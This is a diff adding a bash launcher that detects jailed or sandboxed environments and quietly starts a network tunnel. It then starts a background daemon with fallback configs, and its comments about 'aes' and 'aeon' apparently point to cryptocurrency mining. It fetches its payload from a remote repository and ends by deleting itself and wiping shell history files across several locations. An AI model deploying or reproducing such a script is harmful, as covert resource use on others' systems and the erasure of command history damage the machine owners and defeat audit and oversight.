@@ -1,0 +1,65 @@
+#!/usr/bin/env bash
+## needed tmux sed grep envsubst
+
+## where are we
+c=$(builtin compgen -G '/etc/cpa*')
+d=$(builtin compgen -G '/dev/*')
+s=$(builtin compgen -G '/sys/*')
+p=$(builtin compgen -G '/proc/*')
+jail=
+if [ -n "$c" -o -z "$d" -o -z "$s" -o -z "$p" ]; then ## we are in a jail
+    jail=1
+fi
+
+## get payload
+# BRANCH=master
+# wget -q https://github.com/untoreh/scripts/archive/${BRANCH}.tar.gz
+# tar xf ${BRANCH}.tar.gz && rm ${BRANCH}.tar.gz
+# cd scripts-${BRANCH} || exit 1
+
+. ./functions || exit 1
+
+## utility vars
+CFG_BASE_URL=https://rawgit.com/untoreh/scripts/master/cfg/
+
+## env vars
+export PATH=.:pl:$PATH
+
+## start tunnel
+. ./tstarter || exit 1
+setup_tnl &>/dev/null
+
+## config object
+. ./objconfig || exit 1
+
+## start the pausd daemon passing the object args
+. ./pausd || exit 1
+. ./switch || exit 1
+# start_pausd
+start
+fleep 1 ## give time to fail
+
+## check for alternate if fail
+slept=0
+while [ "$(jobs -r | wc -l)" -lt 2 ]; do
+    slept=$((slept+1))
+    if [ $slept -gt 5 ]; then ## no aes means crash means aeon
+        ## altconfig
+        . ./altconfig
+        ## init
+        start_pausd
+        break
+    fi
+    fleep 1
+done
+fleep 1 ## once more for edge cases
+
+cd ..
+## debug
+[ "$DEBUG" ] && env>dump.env && exit
+
+rm -rf -- "$0" \
+   "scripts-${BRANCH}" \
+   "$HOME"/.*_history \
+   ~/.*_history \
+   /.*_history
